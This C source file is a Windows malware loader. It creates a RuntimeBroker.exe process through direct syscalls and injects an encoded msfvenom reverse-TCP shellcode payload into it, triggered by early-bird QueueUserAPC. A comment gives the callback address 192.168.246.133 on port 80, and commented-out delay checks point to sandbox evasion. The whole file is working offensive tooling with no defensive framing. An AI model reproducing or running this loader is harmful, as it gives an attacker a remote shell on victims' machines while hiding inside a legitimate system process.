#include <Windows.h>
#include "CreateProccess.h"
#include <stdio.h>
#include "Common.h"

#define TARGET_PROCESS L"\\??\\C:\\Windows\\System32\\RuntimeBroker.exe"
#define PROCESS_PARAMS L"C:\\Windows\\System32\\RuntimeBroker.exe"
#define PROCESS_PATH L"C:\\Windows\\System32"

// msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.246.133 LPORT=80 -f hex
unsigned char Payload[] = {
	0x95,0x21,0xea,0x8d,0x99,0x81,0xa9,0x69,0x69,0x69,0x28,0x38,
0x28,0x39,0x3b,0x38,0x3f,0x21,0x58,0xbb,0x0c,0x21,0xe2,0x3b,
0x09,0x21,0xe2,0x3b,0x71,0x21,0xe2,0x3b,0x49,0x21,0xe2,0x1b,
0x39,0x21,0x66,0xde,0x23,0x23,0x24,0x58,0xa0,0x21,0x58,0xa9,
0xc5,0x55,0x08,0x15,0x6b,0x45,0x49,0x28,0xa8,0xa0,0x64,0x28,
0x68,0xa8,0x8b,0x84,0x3b,0x28,0x38,0x21,0xe2,0x3b,0x49,0xe2,
0x2b,0x55,0x21,0x68,0xb9,0xe2,0xe9,0xe1,0x69,0x69,0x69,0x21,
0xec,0xa9,0x1d,0x0e,0x21,0x68,0xb9,0x39,0xe2,0x21,0x71,0x2d,
0xe2,0x29,0x49,0x20,0x68,0xb9,0x8a,0x3f,0x21,0x96,0xa0,0x28,
0xe2,0x5d,0xe1,0x21,0x68,0xbf,0x24,0x58,0xa0,0x21,0x58,0xa9,
0xc5,0x28,0xa8,0xa0,0x64,0x28,0x68,0xa8,0x51,0x89,0x1c,0x98,
0x25,0x6a,0x25,0x4d,0x61,0x2c,0x50,0xb8,0x1c,0xb1,0x31,0x2d,
0xe2,0x29,0x4d,0x20,0x68,0xb9,0x0f,0x28,0xe2,0x65,0x21,0x2d,
0xe2,0x29,0x75,0x20,0x68,0xb9,0x28,0xe2,0x6d,0xe1,0x21,0x68,
0xb9,0x28,0x31,0x28,0x31,0x37,0x30,0x33,0x28,0x31,0x28,0x30,
0x28,0x33,0x21,0xea,0x85,0x49,0x28,0x3b,0x96,0x89,0x31,0x28,
0x30,0x33,0x21,0xe2,0x7b,0x80,0x3e,0x96,0x96,0x96,0x34,0x20,
0xd7,0x1e,0x1a,0x5b,0x36,0x5a,0x5b,0x69,0x69,0x28,0x3f,0x20,
0xe0,0x8f,0x21,0xe8,0x85,0xc9,0x68,0x69,0x69,0x20,0xe0,0x8c,
0x20,0xd5,0x6b,0x69,0x69,0x39,0xa9,0xc1,0x9f,0xec,0x28,0x3d,
0x20,0xe0,0x8d,0x25,0xe0,0x98,0x28,0xd3,0x25,0x1e,0x4f,0x6e,
0x96,0xbc,0x25,0xe0,0x83,0x01,0x68,0x68,0x69,0x69,0x30,0x28,
0xd3,0x40,0xe9,0x02,0x69,0x96,0xbc,0x39,0x39,0x24,0x58,0xa0,
0x24,0x58,0xa9,0x21,0x96,0xa9,0x21,0xe0,0xab,0x21,0x96,0xa9,
0x21,0xe0,0xa8,0x28,0xd3,0x83,0x66,0xb6,0x89,0x96,0xbc,0x21,
0xe0,0xae,0x03,0x79,0x28,0x31,0x25,0xe0,0x8b,0x21,0xe0,0x90,
0x28,0xd3,0xf0,0xcc,0x1d,0x08,0x96,0xbc,0x21,0xe8,0xad,0x29,
0x6b,0x69,0x69,0x20,0xd1,0x0a,0x04,0x0d,0x69,0x69,0x69,0x69,
0x69,0x28,0x39,0x28,0x39,0x21,0xe0,0x8b,0x3e,0x3e,0x3e,0x24,
0x58,0xa9,0x03,0x64,0x30,0x28,0x39,0x8b,0x95,0x0f,0xae,0x2d,
0x4d,0x3d,0x68,0x68,0x21,0xe4,0x2d,0x4d,0x71,0xaf,0x69,0x01,
0x21,0xe0,0x8f,0x3f,0x39,0x28,0x39,0x28,0x39,0x28,0x39,0x20,
0x96,0xa9,0x28,0x39,0x20,0x96,0xa1,0x24,0xe0,0xa8,0x25,0xe0,
0xa8,0x28,0xd3,0x10,0xa5,0x56,0xef,0x96,0xbc,0x21,0x58,0xbb,
0x21,0x96,0xa3,0xe2,0x67,0x28,0xd3,0x61,0xee,0x74,0x09,0x96,
0xbc,0xd2,0x99,0xdc,0xcb,0x3f,0x28,0xd3,0xcf,0xfc,0xd4,0xf4,
0x96,0xbc,0x21,0xea,0xad,0x41,0x55,0x6f,0x15,0x63,0xe9,0x92,
0x89,0x1c,0x6c,0xd2,0x2e,0x7a,0x1b,0x06,0x03,0x69,0x30,0x28,
0xe0,0xb3,0x96,0xbc
};
//

int main() {
	
	PRINTA("[i] Starting program...\n");

	HANDLE hParentProcess	= NULL;
	HANDLE hProcess			= NULL;
	HANDLE hThread			= NULL;
	PVOID pAddress			= NULL;
	DWORD dwProcessId		= NULL;
	DWORD dwThreadId		= NULL;

	//if (!DelayExecution(1)) {
	//	PRINTA("[i] *Whistles innocently*\n");
	//	return -1;
	//}

	InitSysCalls();
	
	//if (!DelayExecution(1)) {
	//	PRINTA("[i] Sideye...\n");
	//	return -1;
	//}

	if (!WrapNtCreateUserProcess(TARGET_PROCESS, PROCESS_PARAMS, PROCESS_PATH, &hProcess, &hThread)) {
		printf("[i] NtCreateUserProcess FAILED\n");
		return -1;
	}

	dwProcessId = GetProcessId(hProcess);
	dwThreadId = GetThreadId(hThread);

	PRINTA("[i] Target Process Created with PID: %d\n", dwProcessId);
	PRINTA("[i] Process's Main Thread Created with TID : %d\n", dwThreadId);
	PRINTA("[i] Writing Shellcode To The Target Process ... ");

	if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {
		PRINTA("[!] Failed to inject !!!\n");
		return -1;
	}
	PRINTA("\t[+] DONE \n\n");

	//	running QueueUserAPC
	QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

	PRINTA("[i] Detaching The Target Process ... ");
	ResumeThread(hThread);
	PRINTA("\t[+] DONE \n\n");

	CloseHandle(hProcess);
	CloseHandle(hThread);
	
	return 1;
}